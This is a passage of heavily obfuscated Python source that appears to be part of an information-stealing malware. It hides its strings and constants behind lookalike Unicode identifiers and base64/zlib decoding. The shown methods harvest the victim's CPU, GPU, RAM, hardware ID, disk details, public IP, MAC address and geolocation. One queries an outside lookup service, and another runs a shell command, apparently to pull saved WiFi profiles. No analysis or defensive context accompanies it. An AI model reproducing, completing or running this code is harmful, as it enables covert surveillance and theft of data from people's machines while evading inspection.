        𝙜𝗽𝘂 = 𝘸𝙢𝙞.WMI().Win32_VideoController()[𝙞𝗻𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 446 - (𝘪𝗻𝙩(𝙊) + 𝗶), 𝙢𝙖𝙥(__𝙞𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝘪𝘁𝗲𝙧(__𝗶𝘮𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝘯𝗴𝘦(0)), __𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
        𝗿𝙖𝗺 = 𝙧𝗼𝘂𝗻𝘥(𝗳𝘭𝙤𝙖𝘵(𝘄𝙢𝗶.WMI().Win32_OperatingSystem()[𝘪𝗻𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 572 - (𝗶𝗻𝘵(𝘖) + 𝗶), 𝘮𝘢𝗽(__𝗶𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘁𝗲𝘳(__𝙞𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝗲(0)), __𝘪𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].TotalVisibleMemorySize) / 𝘪𝙣𝘵.from_bytes(𝘮𝙖𝘱(lambda O, i: 800 - (𝙞𝗻𝘵(𝗢) + 𝘪), 𝘮𝙖𝗽(__𝗶𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝗶𝘵𝗲𝗿(__𝗶𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3wq,\xf7\xab\xca6\xf5\xabJ\xaf\x04\x00\x1a\xa3\x04\\')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝘦(3)), __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), 𝙞𝙣𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 597 - (𝙞𝗻𝘁(𝙊) + 𝘪), 𝘮𝙖𝙥(__𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝘵𝘦𝙧(__𝗶𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝘦(0)), __𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝗵𝘄𝘪𝗱 = 𝘨𝗲𝘵_𝘩𝘄𝙞𝙙()
        return (__𝘪𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0bp)p\tu\x0b5\xf3\rq,\xf7sq\xad\xf2\rI7\xf4\xcd\xf2,\xf7wq4\xf2\xcbJ.\xf7\r1I\x0f5\xce\xa9Jq\x0f+\x01\x00=\x86\x0e\x80')).decode(), __𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0f4t\n\xf3\xcft2O\x0b,\xf0\x08u\x0b5\xf3\xf4(\xb1t\xce\xf1r\n\t\xc9OO56\xf0\x0evK\xf1\nr\x01\xb1\r\xd3#\xdd\x1dm\x01\xae\x1e\x105')).decode().format(𝗰𝗽𝙪, 𝘨𝘱𝘶, 𝗿𝗮𝗺, 𝗵𝙬𝗶𝘥), False)

    def disk_data(self):
        𝗱𝗶𝙨𝙠 = (__𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝗶𝘯𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 532 - (𝗶𝗻𝙩(𝗢) + 𝘪), 𝙢𝘢𝗽(__𝘪𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝙩𝙚𝙧(__𝗶𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0b\xf14\x01\x00\x02\xfe\x01 ')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(1)), __𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(__𝘪𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0b\xf2\xf0*H\xc9\r\xb5\x05\x00\x0c:\x02\xb8')).decode(), __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xca\xf3\xca\x89\n\xb4\xb5\x05\x00\x0c\x84\x02\x9c')).decode(), __𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0bs\xb74\x88\x0c/\xb7\x05\x00\n\x83\x02k')).decode(), __𝗶𝙢𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcb\xf1\n\xb4\xb5\x05\x00\x0b\xe2\x02~')).decode()) + __𝗶𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        for 𝙥𝗮𝗿𝙩 in 𝘱𝘴𝘶𝙩𝙞𝗹.disk_partitions(all=False):
            if 𝘰𝘴.name == __𝙞𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xca\x0b\xb4\x05\x00\x03\xb5\x01_')).decode():
                if __𝘪𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b4\n\xaaL22\xb0\x05\x00\x0b2\x02X')).decode() in 𝗽𝙖𝙧𝙩.opts or 𝙥𝗮𝙧𝘵.fstype == __𝗶𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                    continue
            𝙪𝙨𝘢𝘨𝙚 = 𝙥𝘀𝙪𝙩𝙞𝗹.disk_usage(𝗽𝗮𝙧𝙩.mountpoint)
            𝘥𝙞𝘀𝘬 += (__𝘪𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝘪𝙣𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 661 - (𝗶𝘯𝙩(𝘖) + 𝗶), 𝗺𝘢𝙥(__𝗶𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝙚𝗿(__𝘪𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcb\n5\x06\x00\x03W\x01A')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝘦(1)), __𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(𝗽𝙖𝗿𝘵.device, 𝙨𝘁𝘳(𝘶𝙨𝙖𝙜𝘦.free // 𝗶𝙣𝙩.from_bytes(𝗺𝘢𝙥(lambda O, i: 774 - (𝘪𝘯𝘵(𝙊) + 𝗶), 𝙢𝙖𝙥(__𝙞𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝙩𝙚𝘳(__𝗶𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xabJ\xae\x04\x00\x03\xe9\x01\xa5')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝘦(1)), __𝘪𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝙞𝘯𝙩.from_bytes(𝗺𝗮𝙥(lambda O, i: 772 - (𝗶𝘯𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝗶𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝘁𝙚𝙧(__𝗶𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x04\x00\x03\xc5\x01\x93')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝘦(1)), __𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝙞𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝙨𝘁𝗿(𝘂𝘴𝙖𝘨𝗲.total // 𝙞𝗻𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 914 - (𝗶𝗻𝘁(𝙊) + 𝘪), 𝘮𝘢𝙥(__𝗶𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝘦𝗿(__𝗶𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0fq\xad\x04\x00\x03?\x01b')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝙚(1)), __𝙞𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝙞𝘯𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 781 - (𝙞𝙣𝙩(𝙊) + 𝗶), 𝙢𝘢𝗽(__𝘪𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝘁𝗲𝘳(__𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xab\n\xad\x00\x00\x03\xcc\x01\x96')).decode())] * 3)), 𝗿𝘢𝙣𝙜𝙚(1)), __𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝗶𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘀𝘁𝗿(𝙪𝘴𝗮𝙜𝘦.percent) + __𝙞𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\n\xb4\xb5\x05\x00\x02\xd6\x01\x16')).decode()) + __𝗶𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        return (__𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcf\x8d*N2v*O\r\xb3\xccN\x8c\xf0+\xf2\xcftr\x05\xd1\x00i\x91\x08h')).decode(), __𝗶𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝘥𝗶𝘀𝘬), False)

    def network_data(self):

        def geolocation(ip):
            𝘶𝗿𝙡 = __𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,Hvw+O\x0c6\xcdJ\xaa\xb44O\x0b\xb6,L6\xb2,\xf5)\xb7\xb5\x05\x00\xd7\xbb\x0b\xb0')).decode().format(𝗶𝙥)
            𝙧𝗲𝙨𝗽𝗼𝘯𝘴𝘦 = 𝙧𝘦𝘲𝙪𝗲𝘴𝘁𝙨.get(𝘂𝘳𝗹, headers={__𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcbI\xce4t\x8a2\n+Mq\xb4\xb5\x05\x00-@\x05\x1e')).decode(): __𝗶𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\r\xcd\xcb\x0eD0\x14\x00\xd0oR2\x8f\x85\x85G\x0c\xa6mRJ\xcbN#\xb9\xa6*\x11\xe2\xd5\xaf\x1f\x1fpr\xb8x?:q\xaeM\xf9r\xb0\x0e\xe0\x9b\xf4\xb3\x9a\x8a\xbdw\tp\xc3\x80\xf0`#\xf1\n52\x1b\xd5\xec\x99\xa5\x80h4\x02\x93\xe1\xa1>\xb5lE\x8e;\xc9v\xca\x89\x8b5AY4\xe02)(\x8f\x0eP\x1f\xb3\xb4e\x98\xb6\x82.\xea\xba\r\x1a.\x85\x1c\x83\xedx\xde\xd7Fc\xe6\x92\x9fw\x12\xcd\xa0B\xc9\xd4\xc8|\xc6\xb6\xb2\xf4\xf2,\x05\xdf\xff\x03%74\xf8')).decode()})
            𝙙𝗮𝙩𝗮 = 𝙧𝗲𝘴𝘱𝙤𝘯𝘀𝙚.json()
            return (𝙙𝗮𝘁𝘢[__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b4\xb24L\xca\x0b\xaaL\r\xb4\xb5\x05\x00\x17\xea\x03\xc1')).decode()], 𝙙𝗮𝙩𝙖[__𝗶𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\xce\r\xcbK\x0c\xb7,\x05\x00\r\xb5\x02\xfb')).decode()], 𝙙𝙖𝘵𝙖[__𝙞𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8b4\xca1H\r\xb4\xb5\x05\x00\n\xe4\x02X')).decode()], 𝘥𝘢𝘁𝙖[__𝙞𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKv\xb7\xacJqw+\x06\x00\x0c-\x02\xc2')).decode()], 𝙙𝙖𝘵𝘢[__𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8b\x8c\xf0+\x05\x00\x03\x81\x01u')).decode()])
        𝘪𝘱 = 𝙧𝗲𝗾𝘶𝘦𝘀𝘁𝙨.get(__𝘪𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb44N1N.\x8d4\xaa(K\t\x0f\xcaMrw\xab\x8c\n6\xcdJ22(\x8b4\n*\xf5\t\xf7\xcbK\x0c\xb64H\xceu\xcb\x8a\n\xb4\xb5\x05\x00\t#\x12N')).decode()).text.split(__𝗶𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\x8cp\xb4\x04\x00\x03K\x014')).decode())[𝙞𝙣𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 397 - (𝗶𝙣𝙩(𝙊) + 𝙞), 𝗺𝗮𝙥(__𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝘵𝗲𝙧(__𝗶𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xad\xca6\x02\x00\x03\xae\x01e')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝗲(1)), __𝙞𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].split(__𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())[𝙞𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 360 - (𝙞𝙣𝘵(𝗢) + 𝘪), 𝘮𝘢𝙥(__𝘪𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝘵𝘦𝘳(__𝘪𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝗻𝘨𝘦(0)), __𝙞𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝙢𝙖𝙘 = __𝙞𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode().join(𝘳𝙚.findall(__𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b"x\xda\xf3\xc94\xb1\x05\x00\x03\x14\x01'")).decode(), __𝙞𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\nq\xac\xf0\xcdK\xb7\x05\x00\x0c\x0b\x02\xb7')).decode() % 𝘂𝘶𝗶𝘥.getnode()))
        (𝘤𝙤𝙪𝙣𝘵𝙧𝘺, 𝙧𝘦𝗴𝗶𝘰𝘯, 𝘤𝙞𝘁𝙮, 𝘇𝘪𝙥_, 𝗮𝘀_) = 𝘨𝗲𝗼𝙡𝘰𝘤𝙖𝘁𝙞𝘰𝙣(𝗶𝙥)
        return (__𝗶𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcf\xf3\xcbHq\x0f+Nr\xcf1\x88\n\xc9O\x0f\xc9\r3H1\xb2\xacL,\xb7\xb5\x05\x00\x8e\x0c\t\x92')).decode(), __𝗶𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0f\x0esL\x0f\x0c\x0f\xcaN\xce\r\xabJ\xae\xcaOO5\xca)O\x0b,\xf0\x0b\x0c\xf5E\x137\xcc\x8846\xf0\x0e4\xb24L\xca\x0b\xaaL\r\x01\x89\xf9\x95\xa5\x84\x9b\x1a$\xe7\xe5X:\xe7x\xe5D\x19\xe5\x94%e\x01\xc5\x8d\xa1\xec<\x90\xfa\x1c\x03\xa8\xda\x82\x14\x8f\x1cKO\xe7\x0c\xf3\xd4\xdc\x9c\xf2\x08c\x83\x02\xe7\xec\x9c\x90P\x17\x90\x9c[U\x84\xb1az\xa4\xbb\xa3-\x00\x17/2\xe3')).decode().format(ip=𝗶𝘱, mac=𝗺𝗮𝗰, country=𝗰𝘰𝘶𝙣𝘁𝙧𝘺, region=𝘳𝘦𝙜𝙞𝘰𝗻, city=𝘤𝗶𝙩𝙮, zip_=𝘇𝘪𝙥_, as_=𝘢𝘴_), False)

    def wifi_data(self):
        (𝗻𝘦𝙩𝘄𝘰𝘳𝘬𝘀, 𝙤𝙪𝘁) = ([], __𝘪𝘮𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        try:
            𝘄𝘪𝙛𝙞 = 𝙨𝘂𝗯𝘱𝘳𝙤𝘤𝘦𝙨𝘀.check_output([__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝘪𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝘪𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\x8a\xf0\xb5\x05\x00\x1c\xab\x04N')).decode()], shell=True, stdin=𝘀𝙪𝗯𝗽𝗿𝙤𝘤𝘦𝘀𝙨.PIPE, stderr=𝘴𝘂𝘣𝙥𝗿𝘰𝗰𝘦𝙨𝙨.PIPE).decode(__𝙞𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
            𝘄𝙞𝙛𝙞 = [𝗶.split(__𝙞𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝘪𝗻𝘁.from_bytes(𝘮𝘢𝗽(lambda O, i: 919 - (𝘪𝗻𝙩(𝙊) + 𝙞), 𝗺𝙖𝗽(__𝙞𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝘵𝘦𝗿(__𝘪𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0fq5\x01\x00\x02\xfa\x01\x1d')).decode())] * 3)), 𝘳𝙖𝙣𝘨𝘦(1)), __𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝘪𝙣𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 876 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝗺𝘢𝗽(__𝗶𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝘵𝗲𝘳(__𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3wI6\x04\x00\x03\x03\x01(')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝘦(1)), __𝘪𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝙞𝗻𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 570 - (𝗶𝘯𝘁(𝙊) + 𝗶), 𝘮𝘢𝗽(__𝗶𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝘵𝙚𝙧(__𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0b\x894\x05\x00\x03\x1f\x011')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝘦(1)), __𝗶𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝗶 in 𝘸𝙞𝙛𝘪 if 